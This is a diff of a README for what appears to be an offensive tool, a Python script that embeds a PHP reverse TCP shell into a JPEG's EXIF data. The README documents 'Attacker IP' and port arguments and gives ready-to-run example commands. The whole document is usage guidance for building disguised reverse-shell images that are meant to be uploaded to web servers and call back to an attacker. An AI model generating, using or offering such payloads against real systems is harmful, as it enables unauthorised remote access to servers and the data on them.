@@ -1,2 +1,23 @@
-# PHP-Reverse-Shell-Image-Generator
-A PHP Reverse TCP Shell Image Generator
+# PHP-Reverse-Shell-Image-Generato
+
+## Generate PHP Reverse Shell Image (JPEG)
+
+------------------------------------------------
+### Required Arguments
+------------------------------------------------
+-i,  --image        Image File to Convert (Required)
+-a,  --ipaddr       Attacker IP (Required)
+------------------------------------------------
+### Optional Arguments
+------------------------------------------------
+-p,  --port         Attacker Port [default:21]
+-o,  --outfilename  Use a Different Name to Original Image
+-h,  --help         Show Help
+------------------------------------------------
+
+### Syntax
+------------------------------------------------------------------------------------------------------------------------------
+python3 PHPReverseShell2ImageExif.py --image="image.jpeg" --ipaddr"<IP>" --port"<PORT>" --outfilename"newimage.jpg"
+python3 PHPReverseShell2ImageExif.py --image="image.jpeg" --ipaddr"<IP>" --port"<PORT>"
+python3 PHPReverseShell2ImageExif.py --image="image.jpeg" --ipaddr"<IP>"
+------------------------------------------------------------------------------------------------------------------------------
